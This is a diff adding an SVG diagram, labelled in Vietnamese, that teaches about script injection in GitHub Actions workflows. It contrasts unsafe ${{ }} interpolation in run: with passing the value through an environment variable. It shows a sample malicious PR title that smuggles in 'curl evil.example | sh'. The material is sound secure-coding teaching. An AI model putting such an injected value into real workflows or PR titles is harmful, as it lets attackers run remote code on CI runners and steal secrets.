@@ -1,0 +1,24 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 420" width="960" height="420" font-family="Inter, 'Segoe UI', system-ui, sans-serif">
+<defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="#475569"/></marker></defs>
+<rect width="960" height="420" rx="18" fill="#f8fafc" stroke="#cbd5e1"/>
+<text x="40" y="58" font-size="30" font-weight="700" fill="#0f172a">Script injection: dữ liệu ngoài biến thành lệnh</text>
+<rect x="40" y="85" width="880" height="56" rx="12" fill="#fef3c7" stroke="#d97706" stroke-width="2.5"/>
+<text x="60" y="120" font-size="20" text-anchor="start" fill="#0f172a" font-weight="700">Tiêu đề PR do người ngoài đặt:</text>
+<text x="385" y="120" font-size="20" text-anchor="start" fill="#dc2626" font-weight="700" font-family="Consolas, 'Courier New', monospace">x"; curl evil.example | sh; echo "</text>
+<rect x="40" y="160" width="430" height="38" rx="19" fill="#fee2e2" stroke="#dc2626" stroke-width="2"/>
+<text x="255" y="186" font-size="20" text-anchor="middle" fill="#dc2626" font-weight="700">✗ Nhúng ${{ }} thẳng vào run:</text>
+<rect x="40" y="208" width="430" height="160" rx="12" fill="#0f172a" stroke="#0f172a" stroke-width="1"/>
+<text x="60" y="244" font-size="20" text-anchor="start" fill="#94a3b8" font-family="Consolas, 'Courier New', monospace"># shell nhận 3 lệnh:</text>
+<text x="60" y="274" font-size="20" text-anchor="start" fill="#e2e8f0" font-family="Consolas, 'Courier New', monospace">echo "PR title is x";</text>
+<text x="60" y="304" font-size="20" text-anchor="start" fill="#f87171" font-family="Consolas, 'Courier New', monospace">curl evil.example | sh;</text>
+<text x="60" y="334" font-size="20" text-anchor="start" fill="#e2e8f0" font-family="Consolas, 'Courier New', monospace">echo ""</text>
+<rect x="490" y="160" width="430" height="38" rx="19" fill="#dcfce7" stroke="#16a34a" stroke-width="2"/>
+<text x="705" y="186" font-size="20" text-anchor="middle" fill="#16a34a" font-weight="700">✓ Đi qua biến môi trường</text>
+<rect x="490" y="208" width="430" height="160" rx="12" fill="#0f172a" stroke="#0f172a" stroke-width="1"/>
+<text x="510" y="244" font-size="20" text-anchor="start" fill="#e2e8f0" font-family="Consolas, 'Courier New', monospace">env:</text>
+<text x="510" y="274" font-size="20" text-anchor="start" fill="#e2e8f0" font-family="Consolas, 'Courier New', monospace">  PR_TITLE: ${{ ... }}</text>
+<text x="510" y="304" font-size="20" text-anchor="start" fill="#4ade80" font-family="Consolas, 'Courier New', monospace">echo "PR is $PR_TITLE"</text>
+<text x="510" y="334" font-size="20" text-anchor="start" fill="#94a3b8" font-family="Consolas, 'Courier New', monospace"># chỉ là dữ liệu</text>
+<text x="480" y="400" font-size="20" text-anchor="middle" fill="#475569" font-weight="700">${{ }} được thay thành chuỗi trước khi shell chạy</text>
+
+</svg>
